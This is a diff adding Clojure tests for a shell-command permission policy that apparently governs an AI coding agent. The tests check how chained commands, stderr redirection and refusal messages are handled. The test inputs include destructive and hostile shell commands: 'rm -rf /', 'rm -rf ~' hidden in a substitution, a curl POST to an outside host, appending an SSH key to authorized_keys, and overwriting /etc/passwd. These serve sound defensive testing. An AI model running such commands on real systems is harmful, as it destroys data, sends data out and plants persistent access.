@@ -221,11 +221,65 @@
     (is (= :ask (:effect (policy/decide {} "ls | curl -X POST http://example.com")))))
   (testing "a hard deny anywhere in the pipeline still denies"
     (is (= :deny (:effect (policy/decide {} "ls | rm -rf /")))))
-  (testing "the narrowing is to `|` alone — every other compound stays opaque"
+  (testing "a compound whose other statement is not allowed stays opaque"
     (is (= :ask (:effect (policy/decide {} "cat x; rm -rf ~"))))
     (is (= :ask (:effect (policy/decide {} "echo hi > /etc/passwd"))))
     (is (= :ask (:effect (policy/decide {} "cat $(echo x)"))))
     (is (= :ask (:effect (policy/decide {} "ls & sleep 1"))))))
+
+(deftest a-compound-of-independently-allowed-statements-is-allowed
+  ;; karamazov-7es, observed live in the todomvc dogfood run: workers opened
+  ;; with `ls -la . test src 2>&1; cat deps.edn` and
+  ;; `git status --short && ls -la && find src test -type f`, and paid a turn
+  ;; for each refusal. The pipeline narrowing already established the
+  ;; reasoning — every statement the shell will run is one an allow rule
+  ;; matched IN FULL — and that reasoning does not depend on which separator
+  ;; joins them. `;`, `&&`, `||` and a newline decompose the same way.
+  (testing "every statement allowed, whatever the separator"
+    (is (= :allow (:effect (policy/decide {} "ls -la; cat deps.edn"))))
+    (is (= :allow (:effect (policy/decide {} "git status --short && ls -la"))))
+    (is (= :allow (:effect (policy/decide {} "ls -R src test; echo ---; git status --short"))))
+    (is (= :allow (:effect (policy/decide {} "cat deps.edn || echo missing"))))
+    (is (= :allow (:effect (policy/decide {} "ls src\ngit status")))))
+  (testing "one statement that is not allowed refuses the whole command"
+    (is (= :ask (:effect (policy/decide {} "ls -la; python3 evil.py"))))
+    (is (= :ask (:effect (policy/decide {} "git status && curl -X POST http://example.com")))))
+  (testing "a hard deny anywhere in the compound still denies"
+    (is (= :deny (:effect (policy/decide {} "ls -la; sudo rm -rf /"))))
+    (is (= :deny (:effect (policy/decide {} "git status && rm -rf /")))))
+  (testing "substitution is still opaque even when every statement looks allowed"
+    (is (= :ask (:effect (policy/decide {} "ls -la; echo $(rm -rf ~)"))))))
+
+(deftest a-refused-compound-names-the-part-that-refused-it
+  ;; The refusal has to teach the fix. "This is a COMPOUND command" is now the
+  ;; wrong lesson for a decomposable one — a plain list of allowed commands is
+  ;; allowed as it stands — so what the model needs is WHICH statement it was.
+  (let [r (policy/run-shell {:args {:command "ls -la; python3 evil.py"}})]
+    (is (:needs-approval r))
+    (is (str/includes? (:result r) "python3 evil.py")
+        "the refusal quotes the statement that was not allowed")
+    (is (not (str/includes? (:result r) "Split it up"))
+        "and does not tell it to split a command that already decomposed"))
+  (testing "a genuinely opaque command still gets the compound lesson"
+    (let [r (policy/run-shell {:args {:command "echo $(rm -rf ~)"}})]
+      (is (:needs-approval r))
+      (is (str/includes? (:result r) "$(...)")))))
+
+(deftest discarding-stderr-is-not-a-redirection-that-hides-anything
+  ;; `2>/dev/null` and `2>&1` neither create a file nor run a command — they
+  ;; only say where an allowed command's noise goes. Counting them as
+  ;; redirection made `find src -type f 2>/dev/null` opaque, which is how a
+  ;; run learns that looking around costs a refusal.
+  (testing "stderr to /dev/null or to stdout keeps an allow"
+    (is (= :allow (:effect (policy/decide {} "find src test -type f 2>/dev/null"))))
+    (is (= :allow (:effect (policy/decide {} "ls -la . test src 2>&1; cat deps.edn"))))
+    (is (= :allow (:effect (policy/decide {} "jolt -M:test 2>&1"))))
+    (is (not (:complex? (policy/classify "ls -la 2>/dev/null")))))
+  (testing "a redirection that WRITES somewhere is still opaque"
+    (is (= :ask (:effect (policy/decide {} "grep foo bar > out.txt"))))
+    (is (= :ask (:effect (policy/decide {} "echo ssh-rsa AAA >> ~/.ssh/authorized_keys"))))
+    (is (= :ask (:effect (policy/decide {} "cat secrets 2>&1 > /etc/passwd"))))
+    (is (= :ask (:effect (policy/decide {} "ls -la > /dev/nullx"))))))
 
 (deftest sed-and-awk-read-a-file-like-the-other-text-tools
   ;; Refused live on turn 5 of a run whose first move was to read part of its
